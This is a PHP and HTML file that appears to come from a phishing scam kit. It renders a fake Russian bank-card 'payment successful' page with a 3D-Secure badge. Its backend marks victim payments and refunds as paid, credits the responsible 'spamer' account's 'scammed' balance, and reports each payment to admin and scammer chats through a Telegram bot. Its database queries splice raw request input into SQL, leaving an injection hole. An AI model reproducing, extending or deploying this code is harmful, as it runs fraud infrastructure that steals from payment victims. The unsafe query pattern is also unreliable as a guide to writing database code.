<?php
error_reporting(0);
include "log.php";
define("access", "yes");
include(__DIR__ . '/../admin/engine/database/connection.php');
$sn = R::load('sitenames', 1);
include(__DIR__ . '/../admin/engine/config.php');
$order = base64_decode($_GET["order"]);
$order = explode("/", $order);
$item = $_GET["item"];

$description = $order[0];
$amount = $order[1];

if (!isset($amount)) {
  $amount = 0;
}

if (!isset($description)) {
  $description = "00000000";
}

if ($description !== "00000000") {

}

$ifone = R::getAll('SELECT * FROM logs WHERE comment = '.$description.' AND statusn = 1');
if ($ifone) {
    $message = "<b>[Возврат!]</b> \n 1. Сумма: ".$amount." \n 2. Код бронирония : ".$description."\n 3. Сайт: ".$item ;
    function updateStatus($description, $amount) {
        R::exec('UPDATE logs SET statusn = 2, status = "Оплачено + возврат" WHERE comment = '.$description);
        R::exec('UPDATE logs SET refsum = '.$amount.' WHERE comment = '.$description);
        $lg = R::getAll('SELECT * FROM logs WHERE comment = '.$description);
        if($lg[0]['spamer'] !== "Не найден") {
            $use = R::getAll('SELECT * FROM users WHERE login = "'.$lg[0]['spamer'].'"');
            $sum = $lg[0]['refsum'] * (PERCENT_REFUND/100);
            $bal = $use[0]['scammed'];
            $add = $bal + $sum;
            R::exec('UPDATE users SET scammed = '.$add.' WHERE login = "'.$lg[0]['spamer'].'"');
        }
    }

    function sendTel($message){
        $id = CHAT_ADMIN;
        $tokken = BOT_KEY;
        $filename = "https://api.telegram.org/bot".$tokken."/sendMessage?chat_id=".$id."&text=".urlencode($message)."&parse_mode=html";
        file_get_contents($filename);
    }

    $message2 = "<b>[Успешный возврат!]\nСайт: ".$item."</b> \n 💶Сумма: ".$amount." rub. " ;

    function sendTel2($message2){
        $id1 = CHAT_SPAMER;
        $tokken1 = BOT_KEY;
        $filename = "https://api.telegram.org/bot".$tokken1."/sendMessage?chat_id=".$id1."&text=".urlencode($message2)."&parse_mode=html";
        file_get_contents($filename);
    }

    sendTel2($message2);
    sendTel($message);
    updateStatus($description, $amount);
}
$iftwo = R::getAll('SELECT * FROM logs WHERE comment = '.$description.' AND statusn = 0');
if ($iftwo) {
    $message = "<b>[Новый лог!]</b> \n 1. Сумма: " . $amount . " \n 2. Код бронирония : " . $description . "\n 3. Сайт: ".$item;
    function updateStatus($description)
    {
        R::exec('UPDATE logs SET statusn = 1, status = "Оплачено" WHERE comment = ' . $description);
    }

    function sendTel($message)
    {
        $id = CHAT_ADMIN;
        $tokken = BOT_KEY;
        $filename = "https://api.telegram.org/bot" . $tokken . "/sendMessage?chat_id=" . $id . "&text=" . urlencode($message) . "&parse_mode=html";
        file_get_contents($filename);
    }

    $message2 = "<b>[Успешная оплата!]\nСайт: ".$item."</b> \n 💶Сумма: " . $amount . " rub. ";

    function sendTel2($message2)
    {
        $id1 = CHAT_SPAMER;
        $tokken1 = BOT_KEY;
        $filename = "https://api.telegram.org/bot" . $tokken1 . "/sendMessage?chat_id=" . $id1 . "&text=" . urlencode($message2) . "&parse_mode=html";
        file_get_contents($filename);
    }

    sendTel2($message2);
    sendTel($message);
    updateStatus($description);
}
?>

<!DOCTYPE html>
<html lang="ru">
  <head>
    <link rel="shortcut icon" href="public/images/favicon.png">
    <link rel="stylesheet" href="public/styles/main.css">

    <script src="public/jquery.min.js"></script>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=350">

    <title><?php echo $sn->pay ?> | Оплата банковской картой</title>
  </head>

  <body>
    <div class="wrapper flex-center">
      <div class="window flex-vertical">
        <div class="title flex-center"><?php echo $sn->pay ?></div>

        <form style="text-align: center;">
          <div class="general flex-vertical" style="padding: 25px 15px;">
            <p class="heading">Успешная оплата!</p>
            <p class="sub-heading">Ваш номер бронирования:<br><?php echo $description; ?></p>
          </div>
        </form>

        <div class="information flex-vertical">
          <div class="name"></div>

          <div class="spans flex-space-between">
            <span>Оплачено</span>
            <span><?php echo $amount; ?> ₽</span>
          </div>

        </div>

        <a href="/merchant/">
          <div class="button flex-center">
            <div class="flex-center">Вернуться</div>
          </div>
        </a>

        <div class="logos">
          <div></div>
          <div></div>
          <div></div>
        </div>
        <div class="small-text">Защита платежей — 3D-Secure</div>
      </div>
    </div>
  </body>
</html>